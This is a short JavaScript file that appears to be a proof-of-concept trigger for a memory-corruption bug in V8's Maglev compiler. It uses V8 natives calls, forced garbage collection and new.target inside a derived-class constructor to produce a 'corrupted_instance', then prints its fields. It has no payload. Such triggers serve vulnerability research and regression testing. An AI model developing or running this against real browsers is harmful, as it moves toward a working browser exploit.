var v;
var empty_object = {};
let corrupted_instance = null;
class A { }
class B extends A {
    constructor() {
        v = new.target;
        let x = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];
        super();
        gc();
        let a = [1.1];
        this.x = x;
        this.a = a;
    }
}

function gc() {
    for (let i = 0; i < 1000; i++) {
        new ArrayBuffer(0x10000);
    }
}

function trigger_bug() {
    for (let i = 0; i < 100; i++) {
        if (i < 90) gc();
    }

    % PrepareFunctionForOptimization(B);
    corrupted_instance = new B();

    for (let i = 0; i < 10; i++) {
        % OptimizeMaglevOnNextCall(B);
        corrupted_instance = new B();
    }
    console.log("debug x");
    % DebugPrint(corrupted_instance.x);
    console.log("debug a");
    % DebugPrint(corrupted_instance.a);
}

trigger_bug();